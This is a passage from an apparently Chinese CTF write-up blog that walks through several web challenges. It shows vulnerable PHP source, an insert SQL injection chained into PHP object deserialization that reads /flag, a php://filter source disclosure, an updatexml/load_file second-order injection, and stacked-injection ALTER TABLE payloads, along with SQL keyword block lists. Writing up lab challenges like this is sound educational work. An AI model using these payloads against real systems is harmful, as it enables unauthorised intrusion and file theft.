class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$file = <span class="keyword">new</span> upload();</span><br><span class="line">$file-&gt;upload_base();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在一处注入点</p><p><img src="/2019/12/30/积累的一些web题目/16.png" alt=""></p><p><code>helper.php</code>上部分未对<code>title</code>进行过滤，可以在图中红线部分进行<code>insert</code>注入，抽象出来的语句</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into images (`title`,`filename`,`ext`,`path`,`attr`) values (<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>)</span><br></pre></td></tr></table></figure><p><code>a</code>是我们可控的，同时在<code>show.php</code>中发现了反序列化的触发点</p><p><img src="/2019/12/30/积累的一些web题目/17.png" alt="17"></p><p>该处是针对语句中的<code>e</code>进行反序列化操作，通过注入我们可以控制<code>e</code>处序列化的字符串，利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>然后将<code>%00*%00</code>替换为<code>\\0\\0\\0</code>，因为代码中存在该处替换</p><p><img src="/2019/12/30/积累的一些web题目/18.png" alt="18"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"helper"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"\\0\\0\\0config"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"/flag"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"\\0\\0\\0ifview"</span>;<span class="attribute">i</span>:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>因为文件名中不可以有<code>：&quot;</code>等字符，把该段转化成16进制，最后文件名为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a','b','c','d',0x4f3a363a<span class="number">226865</span>6c<span class="number">70657222</span>3a323a7b733a393a225c305c305c<span class="number">3063</span>6f6e<span class="number">66696722</span>3b733a353a222f666c<span class="number">616722</span>3b733a393a225c305c305c<span class="number">30696676696577</span>223b693a313b7d)#</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/19.png" alt="19"></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/1.png" alt=""></p><p>用伪协议读一下源码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>重点代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"已提交订单"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单提交成功"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"订单修改成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"未找到订单!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"信息不全"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中输入的时候<code>confirm.php</code>未对<code>address</code>进行过滤，只是进行了<code>addslashes</code>处理，这样配合修改功能，就可以造成二次注入，可使用报错函数<code>updatexml</code>，<code>payload</code>如下</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' where user_id=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select substr(load_file('/flag.txt'),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>当更新地址时，该句会出现错误带出数据</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row['address'].<span class="string">"' where `user_id`="</span>.$row['user_id']</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/5.png" alt=""></p><p>该题目考察堆叠注入相关知识，其中有如下过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure><p>进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/6.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">use</span> supersqli;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/7.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/8.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/9.png" alt=""></p><p>现在基本上清楚了数据库中表的结构，由于不能使用<code>select</code>，这里使用<code>alter</code>将<code>words</code>表换成<code>1919810931114514</code>，然后添加id字段，同时将<code>flag</code>字段改名为<code>data</code>字段，这样通过查询就可以直接拿到<code>flag</code>,语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">RENAME</span> <span class="keyword">TO</span> moli;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">RENAME</span> <span class="keyword">TO</span> words;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">ADD</span> <span class="keyword">id</span> <span class="built_in">CHAR</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="string">'1'</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">CHANGE</span> flag <span class="keyword">data</span> <span class="built_in">BIGINT</span>;</span><br></pre></td></tr></table></figure><p>直接查询</p><p><img src="/2019/12/30/积累的一些web题目/10.png" alt=""></p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><blockquote><p>考点：伪随机数</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/2.png" alt=""></p><p>控制台查看网络来到<code>check.php</code>，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 